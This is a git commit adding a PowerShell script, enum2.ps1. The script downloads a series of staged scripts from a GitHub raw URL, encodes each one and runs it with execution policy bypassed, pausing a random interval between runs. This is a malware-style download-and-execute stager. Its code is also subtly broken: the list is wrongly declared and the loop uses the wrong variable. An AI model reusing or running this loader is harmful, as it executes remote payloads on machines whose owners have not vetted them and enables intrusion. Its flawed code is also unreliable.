df67015c69326c4ac7d5a84e3072dfc513c267ed
encryptedSubject <148569257+encryptedSubject@users.noreply.github.com>
2024-09-05 17:44:26 -0400

    Create enum2.ps1

---
+++ enum2.ps1
@@ -0,0 +1,24 @@
+function DaEM {
+    param(
+        [string]$Url
+    )
+    $content = (New-Object System.Net.WebClient).DownloadString($Url)
+    $enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($content))
+    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $enc" -NoNewWindow
+}
+
+$files = @{
+    "jS1.ps1",
+    "gS1.ps1",
+    "kS1.ps1",
+    "kS2.ps1",
+    "jS2.ps1",
+    "jS3.ps1"
+
+}
+$base = "https://raw.githubusercontent.com/encryptedSubject/subject1/main/stage/"
+foreach ($fil in $files){
+    $full = $base + $files
+    DaEM $full
+    Start-Sleep (Get-Random -min 60 -max 110)
+}
